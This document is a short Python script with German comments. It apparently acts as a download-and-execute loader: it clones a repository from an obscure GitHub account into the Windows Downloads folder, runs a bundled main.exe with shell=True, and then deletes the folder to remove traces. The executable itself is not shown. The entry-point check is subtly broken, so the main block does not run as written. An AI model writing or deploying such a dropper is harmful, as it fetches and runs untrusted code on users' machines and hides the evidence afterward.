import subprocess
import os
import sys
import shutil

def get_windows_download_folder():
    # Finde den Download-Ordner von Windows
    try:
        from winreg import OpenKey, HKEY_CURRENT_USER, QueryValueEx
        key = OpenKey(HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders')
        download_folder = QueryValueEx(key, '{374DE290-123F-4565-9164-39C4925E467B}')[0]
        return download_folder
    except Exception as e:
        print(f"Fehler beim Abrufen des Download-Ordners: {e}")
        sys.exit(1)

def clone_repo(repo_url, destination_folder):
    # Git-Repository klonen
    clone_command = f"git clone {repo_url} {destination_folder}"
    subprocess.run(clone_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

def execute_main_exe(repo_folder):
    # Den Pfad zur main.exe erstellen
    main_exe_path = os.path.join(repo_folder, "main.exe")

    # Prüfen, ob main.exe existiert, und falls ja, ausführen
    if os.path.isfile(main_exe_path):
        subprocess.run(main_exe_path, shell=True)
    else:
        print("main.exe wurde nicht gefunden.")

if __name__ == "main":
    # Geänderte URL des Git-Repositorys
    repo_url = "https://github.com/asdsasdaddd/w"

    # Verwende den Download-Ordner von Windows
    destination_folder = get_windows_download_folder()

    # Erstellen Sie einen temporären Ordner für das Git-Repository
    temp_repo_folder = os.path.join(destination_folder, "temp_repo")

    # Git-Repository herunterladen
    clone_repo(repo_url, temp_repo_folder)

    # main.exe ausführen
    execute_main_exe(temp_repo_folder)

    # Nach Abschluss das temporäre Verzeichnis löschen
    shutil.rmtree(temp_repo_folder, ignore_errors=True)